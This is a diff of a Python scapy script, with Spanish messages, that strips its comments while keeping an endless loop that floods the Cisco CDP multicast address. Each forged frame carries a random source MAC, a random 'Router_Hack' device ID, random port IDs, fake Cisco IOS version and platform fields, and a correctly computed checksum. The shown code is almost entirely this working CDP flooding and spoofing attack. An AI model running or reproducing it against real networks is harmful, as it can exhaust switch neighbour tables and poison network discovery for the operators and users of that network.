@@ -4,7 +4,7 @@ import time
 import struct
 from scapy.all import *
 
-# --- CONFIGURACIÓN ---
+
 interface = "eth0"
 # ---------------------
 
@@ -35,32 +35,30 @@ print("[*] Presiona Ctrl+C para detener.")
 try:
     packet_count = 0
     while True:
-        # 1. Datos aleatorios
+ 
         mac_src = RandMAC()
         device_id = f"Router_Hack_{RandNum(100,999)}"
         port_id = f"Ethernet{RandNum(0,3)}/{RandNum(0,3)}"
         
         # 2. Preparamos los TLVs
         tlvs = b""
-        tlvs += crear_tlv(0x0001, device_id)               # Device ID
-        tlvs += crear_tlv(0x0003, port_id)                 # Port ID
-        tlvs += crear_tlv(0x0004, b'\x00\x00\x00\x01')     # Capabilities (Router)
-        tlvs += crear_tlv(0x0005, "Cisco IOS 15.2 (IOU)")  # Software Version
-        tlvs += crear_tlv(0x0006, "Cisco IOU L3")          # Platform
+        tlvs += crear_tlv(0x0001, device_id)               
+        tlvs += crear_tlv(0x0003, port_id)                 
+        tlvs += crear_tlv(0x0004, b'\x00\x00\x00\x01')     
+        tlvs += crear_tlv(0x0005, "Cisco IOS 15.2 (IOU)")  
+        tlvs += crear_tlv(0x0006, "Cisco IOU L3")         
 
-        # 3. Calculamos el Checksum
-        # Paso A: Creamos una cabecera temporal con Checksum 0
-        # Version(2) + TTL(180) + Checksum(0)
+
         temp_header = b'\x02\xb4\x00\x00'
         data_to_checksum = temp_header + tlvs
         
-        # Paso B: Calculamos el checksum correcto
+     
         chk = calcular_checksum(data_to_checksum)
         
-        # Paso C: Creamos la cabecera final con el checksum insertado
+      
         final_header = struct.pack("!BBH", 2, 180, chk)
         
-        # 4. Ensamblamos el paquete final
+      
         payload = final_header + tlvs
         
         packet = Ether(src=mac_src, dst="01:00:0c:cc:cc:cc") / \
@@ -68,7 +66,6 @@ try:
                  SNAP(OUI=0x00000c, code=0x2000) / \
                  Raw(load=payload)
 
-        # 5. Enviar
         sendp(packet, iface=interface, verbose=0)
         
         packet_count += 1
